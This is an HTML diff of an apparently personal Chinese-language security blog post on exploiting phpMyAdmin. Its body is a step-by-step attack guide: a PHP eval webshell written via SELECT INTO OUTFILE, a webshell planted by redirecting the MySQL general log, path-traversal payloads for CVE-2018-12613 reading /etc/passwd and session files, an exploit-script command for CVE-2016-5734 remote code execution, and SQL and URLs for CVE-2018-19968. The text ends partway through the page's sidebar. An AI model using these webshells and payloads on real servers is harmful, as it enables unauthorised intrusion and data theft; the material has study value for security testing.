@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>phpmyadmin漏洞利用 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="phpmyadmin漏洞利用获取版本信息访问 1234567readme.phpREADMEchangelog.phpChangeDocumetation.htmlDocumetation.txttranslators.html   getshell 使用爆破工具 , 或者得到账号密码 直接登录  写入文件12345条件拥有root权限网站路径拥有写权限   获取路径方法  123456789ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpmyadmin漏洞利用">
+<meta property="og:url" content="http://example.com/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="phpmyadmin漏洞利用获取版本信息访问 1234567readme.phpREADMEchangelog.phpChangeDocumetation.htmlDocumetation.txttranslators.html   getshell 使用爆破工具 , 或者得到账号密码 直接登录  写入文件12345条件拥有root权限网站路径拥有写权限   获取路径方法  123456789ph">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-211450.jpg">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214348.jpg">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214438.jpg">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214730.jpg">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215200.jpg">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215351.jpg">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215338.jpg">
+<meta property="article:published_time" content="2020-11-22T08:57:47.000Z">
+<meta property="article:modified_time" content="2020-12-08T11:24:17.837Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞利用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-211450.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-phpmyadmin漏洞利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-date">
+  <time class="dt-published" datetime="2020-11-22T08:57:47.000Z" itemprop="datePublished">2020-11-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      phpmyadmin漏洞利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpmyadmin漏洞利用"><a href="#phpmyadmin漏洞利用" class="headerlink" title="phpmyadmin漏洞利用"></a><em>phpmyadmin</em>漏洞利用</h1><h2 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h2><p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readme.php</span><br><span class="line">README</span><br><span class="line">changelog.php</span><br><span class="line">Change</span><br><span class="line">Documetation.html</span><br><span class="line">Documetation.txt</span><br><span class="line">translators.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-211450.jpg"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><blockquote>
+<p>使用爆破工具 , 或者得到账号密码 直接登录</p>
+</blockquote>
+<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line"></span><br><span class="line">拥有root权限</span><br><span class="line">网站路径</span><br><span class="line">拥有写权限</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>获取路径方法</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phpinfo  </span><br><span class="line">某些网站安装完成后 测试文件可能没有删除 phpinfo.php、info.php、1.php、test.php</span><br><span class="line"></span><br><span class="line">查寻mysql路径猜测web路径</span><br><span class="line">select @@datadir as dataPath from dual ;</span><br><span class="line">或者</span><br><span class="line">show variables Like &#x27;%datadir%&#x27;;</span><br><span class="line"></span><br><span class="line">load_file读取网站配置文件 index.php 或者 /etc/passwd等等</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>查询写权限</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;</span><br><span class="line"></span><br><span class="line">secure_file_priv作用</span><br><span class="line">1. 限制load data, select ... outfile, load_file()等</span><br><span class="line">2. 值为null时 , 表示限制mysql为不允许导入导出</span><br><span class="line">3. 值为/tmp/时 , 表示导入 导出只在/tmp目录下</span><br><span class="line">4. 没有值时表示不限制</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>写一句话</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[123]);?&gt;&quot; into outfile &quot;\\xx\\xx\\xxx.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214348.jpg"></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214438.jpg" alt="批注 2020-07-26 214438"></p>
+<h3 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell"></a>利用日志getshell</h3><ol>
+<li><p>开启日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看日志是否开启</span><br><span class="line">SHOW VARIABLES LIKE &#x27;general_log%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-214730.jpg" alt="批注 2020-07-26 214730"></p>
+</li>
+<li><p>开启日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开启日志</span><br><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line">修改日志路径</span><br><span class="line">set global general_log_file=&quot;xx\\xx\\xx\\xx.php&quot;;</span><br><span class="line">查看开启情况</span><br><span class="line">SHOW VARIABLES LIKE &quot;general_log%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215200.jpg" alt="批注 2020-07-26 215200"></p>
+</li>
+<li><p>写入shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">任意执行sql语句</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215351.jpg" alt="批注 2020-07-26 215351"></p>
+</li>
+</ol>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/2020-07-26-215338.jpg" alt="批注 2020-07-26 215338"></p>
+<h3 id="cve-2018-12613后台文件包含"><a href="#cve-2018-12613后台文件包含" class="headerlink" title="cve-2018-12613后台文件包含"></a>cve-2018-12613后台文件包含</h3><p>版本4.8.0和4.8.1</p>
+<p>漏洞分析</p>
+<p><code>index.php  55-63行</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span>. 存在target参数</span><br><span class="line"><span class="number">2</span>. 参数为字符串</span><br><span class="line"><span class="number">3</span>. 不能以index开头</span><br><span class="line"><span class="number">4</span>. target里不能含有黑名单字符</span><br><span class="line"><span class="number">5</span>. 进行checkPageValidity()函数检查</span><br></pre></td></tr></table></figure>
+
+<p><code>$target_blacklist</code></p>
+<p><code>index.php 50-52行</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><code>checkPageValidity()函数</code></p>
+<p><code>Core.php 443-476行</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//$whitelist变量是否为空 , 为空就赋值为self::$goto_whitelist;</span></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//变量是否设置且不为空或者不是字符串</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//$page中是否存在$whitelist中的值</span></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//截取?之间的字符串</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//是否存在$whitelist中的值</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">    <span class="comment">//进行urldecode解码</span></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//截取?之间的值</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//是否存在$whitelist中的值</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>原意是当target值带有参数时能够正确包含 , 但是当传有<code>?或者%3f或者%253f</code>和前面的字符串在<code>$whitelist</code>里面时都会使其绕过检查</p>
+<p>​    <code>$whitelist</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>要利用的就是<code>index.php</code>中的<code>include</code>函数 , 则需要<code>checkPageValidity()</code>函数返true</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php?/../../../../../../../../etc/passwd</span><br><span class="line">?target=db_datadict.php%3f/../../../../../../../../etc/passwd</span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>这些都可以绕过</p>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
+<li><p>包含敏感文件</p>
+</li>
+<li><p>包含上传文件</p>
+</li>
+<li><p>开启并包含日志</p>
+</li>
+<li><p>包含<code>phpsession</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先执行一句sql语句 select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line">包含?target=db_datadict.php%253f/../../../tmp/tmp/sess_xxxxx</span><br><span class="line">phpsession文件名在cookie中找到</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="CVE-2016-5734-RCE"><a href="#CVE-2016-5734-RCE" class="headerlink" title="CVE-2016-5734 RCE"></a>CVE-2016-5734 RCE</h3><p>影响版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin4.3.0-4.6.2</span><br><span class="line">PHP 4.3.0-5.4.6</span><br></pre></td></tr></table></figure>
+
+<p>漏洞原因</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php5.4.7以前 , preg_replace函数有漏洞 , 可以/0进行截断,将正则修改为/e模式,从而执行命令</span><br></pre></td></tr></table></figure>
+
+<p>使用脚本攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmyadmin</span><br><span class="line">python3 40185.py   -u root - root -d test -c &quot;system(whoami)&quot; http://ip:port/</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2018-19968"><a href="#CVE-2018-19968" class="headerlink" title="CVE-2018-19968"></a>CVE-2018-19968</h3><blockquote>
+<p>参考: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3634">https://xz.aliyun.com/t/3634</a></p>
+</blockquote>
+<p>影响版本: phpMyAdmin 4.8.0~4.8.3</p>
+<p>原因</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformation是phpMyAdmin中的一个高级功能，通过Transformation可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段 ‘Filename’，正常情况下 phpMyAdmin 只会将路径显示出来。但是通过Transformation我们可以将该字段转换成超链接，我们就能直接在 phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。</span><br><span class="line"></span><br><span class="line">通常情况下Transformation的规则存储在每个数据库的pma__column_info表中，而在phpMyAdmin 4.8.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。</span><br></pre></td></tr></table></figure>
+
+<p>利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">登录后台后创建数据库</span><br><span class="line">CREATE DATABASE test111;</span><br><span class="line">CREATE TABLE test111.test1111 ( baz VARCHAR(100) PRIMARY KEY );</span><br><span class="line">INSERT INTO test111.test1111 SELECT &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://target/com/chk_rel.php?fixall_pmadb=1&amp;db=test111</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">插入数据 , 执行</span><br><span class="line">INSERT INTO pma__column_info SELECT &#x27;1&#x27;, &#x27;test111&#x27;, &#x27;test1111&#x27;, &#x27;baz&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;../../../../../../../../tmp/sess_9r15lk5a27asrbb6hl8hffv6cp&#x27;,&#x27;plop&#x27;;</span><br><span class="line">xxx换成cookie中的phpmyadmin值</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/tbl_replace.php?db=test111&amp;table=test1111&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-id="ckp231ct30003tcnxayp14twu" data-title="phpmyadmin漏洞利用" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/11/22/Linux%E6%8F%90%E6%9D%83/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Linux提权
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/11/22/MYSQL%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">MYSQL提权复现</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 15px;">提权</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 10px;">数据结构</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 20px;">漏洞利用</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/24/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/TP5-RCE%E5%88%86%E6%9E%90/">TP5 RCE分析</a>
+          </li>
+        
+          <li>
